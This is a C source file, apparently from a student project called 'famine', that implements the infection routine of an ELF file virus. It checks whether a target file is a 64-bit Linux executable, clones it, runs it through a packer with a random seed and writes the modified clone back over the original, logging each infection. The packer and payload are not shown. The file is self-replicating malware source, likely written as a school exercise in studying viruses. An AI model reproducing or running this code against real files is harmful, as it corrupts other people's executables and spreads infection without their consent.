/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
/*   Updated: 2019/12/20 23:11:32 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <linux/elf.h>
#include "infect.h"
#include "syscall.h"
#include "accessors.h"
#include "errors.h"
#include "utils.h"
#include "log.h"

static bool	elf64_identifier(const Elf64_Ehdr *hdr)
{
	if (ft_memcmp(hdr->e_ident, (char[4]){ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3}, SELFMAG) != 0 // wrong Magic
	|| hdr->e_ident[EI_CLASS] != ELFCLASS64           // not 64bit
	|| hdr->e_ident[EI_DATA] != ELFDATA2LSB           // not little endian
	|| hdr->e_entry == 0                              // no entry point
	|| hdr->e_phoff == 0                              // no program hdr table
	|| hdr->e_shoff == 0)                             // no section hdr table
		return false;

	return true;
}

inline bool	infect_if_candidate(const char *file, uint64_t seed[2])
{
	struct famine	food;
	Elf64_Ehdr	elf64_hdr;
	int		fd = famine_open(file, O_RDONLY);

	log_try_infecting(file);

	if (fd < 0)
	{
		return errors(ERR_SYS, _ERR_OPEN_FAILED);
	}
	if (famine_read(fd, &elf64_hdr, sizeof(elf64_hdr)) < (ssize_t)sizeof(elf64_hdr))
	{
		famine_close(fd);
		return errors(ERR_USAGE, _ERR_NOT_ELF);
	}
	if (!elf64_identifier(&elf64_hdr))
	{
		famine_close(fd);
		return errors(ERR_USAGE, _ERR_NOT_ELF);
	}

	famine_close(fd);

	if (!original_accessor(&food.original_safe, file))
		return errors(ERR_THROW, _ERR_INFECT_IF_CANDIDATE);

	if (!clone_accessor(&food.clone_safe, food.original_safe.size))
		return errors(ERR_THROW, _ERR_INFECT_IF_CANDIDATE);

	if (!elf64_packer(food, food.original_safe.size, seed))
		return errors(ERR_THROW, _ERR_INFECT_IF_CANDIDATE);

	if (!write_clone_file(food.clone_safe, file))
		return errors(ERR_THROW, _ERR_INFECT_IF_CANDIDATE);

	free_accessor(&food.original_safe);
	free_accessor(&food.clone_safe);

	log_success();

	return true;
}
